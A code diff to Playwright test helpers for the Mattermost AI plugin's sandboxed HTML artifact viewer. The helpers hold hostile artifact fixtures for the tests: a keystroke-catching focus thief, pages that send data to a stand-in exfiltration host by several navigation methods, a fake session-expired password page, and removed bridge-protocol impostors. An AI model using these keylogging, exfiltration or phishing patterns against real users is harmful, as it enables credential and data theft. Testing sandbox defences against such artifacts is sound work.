@@ -67,13 +67,36 @@ export async function setUserTheme(
     }
 }
 
-/** Inline artifact iframe(s): anything pointing at the plugin's artifact route. */
-export function artifactIframes(scope: Page | Locator): Locator {
-    return scope.locator('iframe[src*="/plugins/mattermost-ai/artifacts/"]');
+/**
+ * The host page's artifact frame(s): the unsandboxed srcdoc wrapper whose CSP
+ * only lets its child frame load the artifact. The artifact itself runs in a
+ * sandboxed iframe inside it (see artifactContentIframe).
+ */
+export function artifactWrappers(scope: Page | Locator): Locator {
+    return scope.locator('iframe[data-testid="html-artifact-wrapper"]');
 }
 
-export function artifactFrame(iframe: Locator): FrameLocator {
-    return iframe.contentFrame();
+/** The sandboxed iframe inside `wrapper` that loads the artifact document. */
+export function artifactContentIframe(wrapper: Locator): Locator {
+    return wrapper.contentFrame().locator('iframe[data-testid="html-artifact-content"]');
+}
+
+/** The artifact document inside `wrapper`. */
+export function artifactFrame(wrapper: Locator): FrameLocator {
+    return artifactContentIframe(wrapper).contentFrame();
+}
+
+/** Matches the artifact content route for one host load: `.../artifacts/<fileId>?n=<nonce>`. */
+export const ARTIFACT_CONTENT_URL = /\/plugins\/mattermost-ai\/artifacts\/([a-z0-9]{26})\?n=([A-Za-z0-9_-]{22})$/;
+
+/** Matches the bridge token route for one host load: `.../artifacts/<fileId>/token?n=<nonce>`. */
+export const ARTIFACT_TOKEN_URL = /\/plugins\/mattermost-ai\/artifacts\/([a-z0-9]{26})\/token\?n=([A-Za-z0-9_-]{22})$/;
+
+/** Clicks Run on the (first) artifact card in `scope`, which every viewer must do before it loads. */
+export async function runArtifact(scope: Locator): Promise<void> {
+    const card = scope.getByTestId('html-artifact-card').first();
+    await card.getByTestId('html-artifact-run').click();
+    await expect(card.getByTestId('html-artifact-run-placeholder')).toHaveCount(0);
 }
 
 /**
@@ -112,9 +135,10 @@ export const FOCUS_THIEF_FILE_NAME = 'focus-thief.html';
 export const FOCUS_THIEF_EXFIL = 'https://exfil.example.invalid/keys';
 
 /**
- * An artifact the viewer never clicks that keeps calling focus() on its own
- * off-screen input from load, to catch keystrokes meant for the message box,
- * and sends whatever it caught away by navigating its frame.
+ * An artifact the viewer runs but never clicks that keeps calling focus() on
+ * its own off-screen input from load, to catch keystrokes meant for the
+ * message box, and tries to send whatever it caught away by navigating its
+ * frame.
  */
 export const FOCUS_THIEF_HTML = `<!doctype html>
 <html lang="en">
@@ -140,65 +164,35 @@ export const FOCUS_THIEF_HTML = `<!doctype html>
 </html>
 `;
 
-export const HUNG_NAVIGATION_FILE_NAME = 'hung-navigation.html';
-export const HUNG_PAGE_TEXT = 'Your Mattermost session expired';
-
-/**
- * An artifact that renders (the host shows it once the bridge is ready),
- * then navigates its frame to `target`, a page that never finishes loading.
- */
-export function hungNavigationHTML(target: string): string {
-    return `<!doctype html>
-<html lang="en">
-<head><meta charset="utf-8"><title>Report</title></head>
-<body>
-<h1>Loading report</h1>
-<script>
-  window.addEventListener('load', function () {
-    setTimeout(function () {
-      location.href = '${target}';
-    }, 1500);
-  });
-</script>
-</body>
-</html>
-`;
-}
-
-export type HungServer = {
+export type ExternalServer = {
     url: string;
 
-    /** Resolves once the browser has requested the page. */
-    requested: Promise<void>;
+    /** Every request path the server has received. */
+    requests: string[];
     close: () => Promise<void>;
 };
 
 /**
- * Serves a fake sign-in page whose response sends headers and some HTML but
- * never ends, so the frame showing it never fires a load event. Listens on
- * the host the browser reaches Mattermost on (loopback for localhost), so
- * the frame's navigation stays within the same address space.
+ * A real server outside Mattermost that records every request it receives,
+ * for proving an artifact never reached it. Listens on the host the browser
+ * reaches Mattermost on (loopback for localhost), so a navigation to it
+ * stays within the same address space.
  */
-export async function startHungServer(mattermostURL: string): Promise<HungServer> {
+export async function startExternalServer(mattermostURL: string): Promise<ExternalServer> {
     const mmHost = new URL(mattermostURL).hostname;
     const host = mmHost === 'localhost' ? '127.0.0.1' : mmHost;
-    let markRequested: () => void = () => undefined;
-    const requested = new Promise<void>((resolve) => {
-        markRequested = resolve;
-    });
+    const requests: string[] = [];
     const server = http.createServer((req, res) => {
-        markRequested();
+        requests.push(req.url ?? '');
         res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store'});
-        res.write(`<!doctype html><html lang="en"><body><h1>${HUNG_PAGE_TEXT}</h1>` +
-            '<p>Sign in again to keep viewing this report.</p><input type="password" aria-label="Password">');
-        const keepAlive = setInterval(() => res.write(' '), 1000);
-        req.on('close', () => clearInterval(keepAlive));
+        res.end('<!doctype html><html lang="en"><body><h1>Your Mattermost session expired</h1>' +
+            '<p>Sign in again to keep viewing this report.</p><input type="password" aria-label="Password"></body></html>');
     });
     await new Promise<void>((resolve) => server.listen(0, host, resolve));
     const {port} = server.address() as AddressInfo;
     return {
         url: `http://${host}:${port}/session-expired`,
-        requested,
+        requests,
         close: () => new Promise<void>((resolve) => {
             server.closeAllConnections();
             server.close(() => resolve());
@@ -402,75 +396,46 @@ export const SPRINT_DASHBOARD_HTML = `<!doctype html>
 </html>
 `;
 
-export const SELF_NAVIGATING_FILE_NAME = 'self-navigating.html';
-export const SELF_NAVIGATION_TARGET = 'https://exfil.example.invalid/beacon';
+export const EXFIL_HOST = 'exfil.example.invalid';
+export const EXFIL_URL = `https://${EXFIL_HOST}/?d=secret`;
 
-/**
- * An artifact that renders, then navigates its own frame to an external URL
- * (a beacon carrying data in the query string).
- */
-export const SELF_NAVIGATING_HTML = `<!doctype html>
-<html lang="en">
-<head><meta charset="utf-8"><title>Navigator</title></head>
-<body>
-<h1>Navigating artifact</h1>
+/** Ways an artifact can navigate its own frame to carry data away in the URL. */
+export type SelfNavigationKind = 'location.href' | 'meta refresh' | 'location.replace before load' | 'link click';
+
+/** An artifact that renders a heading and navigates its own frame to `target` the given way. */
+export function selfNavigationHTML(kind: SelfNavigationKind, target: string): string {
+    const head = kind === 'meta refresh' ? `<meta http-equiv="refresh" content="1;url=${target}">` : '';
+    let body = '';
+    switch (kind) {
+    case 'location.href':
+        body = `<script>
+  window.addEventListener('load', function () {
+    setTimeout(function () { location.href = '${target}'; }, 500);
+  });
+</script>`;
+        break;
+    case 'location.replace before load':
+        body = `<script>location.replace('${target}');</script>`;
+        break;
+    case 'link click':
+        body = `<a id="go" href="${target}">Open report</a>
 <script>
   window.addEventListener('load', function () {
-    setTimeout(function () {
-      location.href = '${SELF_NAVIGATION_TARGET}?d=' + encodeURIComponent(document.title);
-    }, 500);
+    setTimeout(function () { document.getElementById('go').click(); }, 500);
   });
-</script>
-</body>
-</html>
-`;
-
-/**
- * The page served in place of the external target: it impersonates the
- * artifact by speaking the bridge protocol and asking for the viewer's profile.
- */
-export const SELF_NAVIGATION_IMPOSTOR_HTML = `<!doctype html>
-<html><body><p>impostor</p><script>
-  parent.postMessage({mmArtifact: 1, type: 'ready'}, '*');
-  parent.postMessage({mmArtifact: 1, type: 'request', id: 'x1', method: 'getCurrentUser'}, '*');
-</script></body></html>
-`;
-
-export const REPLACING_FILE_NAME = 'replacing.html';
-export const REPLACEMENT_TARGET = 'https://impostor.example.invalid/page';
-
-/**
- * An artifact that replaces itself before its load event with a parser-
- * blocking location.replace(): the frame then fires a single load event for
- * the replacement page, which keeps the frame's sandbox (origin 'null').
- */
-export const REPLACING_HTML = `<!doctype html>
+</script>`;
+        break;
+    }
+    return `<!doctype html>
 <html lang="en">
-<head><meta charset="utf-8"><title>Replacer</title></head>
+<head><meta charset="utf-8"><title>Navigator</title>${head}</head>
 <body>
-<h1>Replacing artifact</h1>
-<script>location.replace('${REPLACEMENT_TARGET}');</script>
+<h1>Navigating artifact</h1>
+${body}
 </body>
 </html>
 `;
-
-/**
- * Served for REPLACEMENT_TARGET: speaks the bridge protocol without the
- * token (and with a guessed one) and records every message it receives.
- */
-export const REPLACEMENT_IMPOSTOR_HTML = `<!doctype html>
-<html><body><p>impostor</p><pre id="received" data-testid="impostor-received"></pre><p id="sent" data-testid="impostor-sent"></p><script>
-  var log = document.getElementById('received');
-  window.addEventListener('message', function (e) {
-    log.textContent += JSON.stringify(e.data) + '\\n';
-  });
-  [undefined, 'guessed-token', ''].forEach(function (token) {
-    parent.postMessage({mmArtifact: 1, type: 'ready', token: token}, '*');
-    parent.postMessage({mmArtifact: 1, type: 'request', id: 'x-' + token, method: 'getCurrentUser', token: token}, '*');
-  });
-  document.getElementById('sent').textContent = 'sent';
-</script></body></html>
-`;
+}
 
 export const TOKEN_PROBE_FILE_NAME = 'token-probe.html';
 
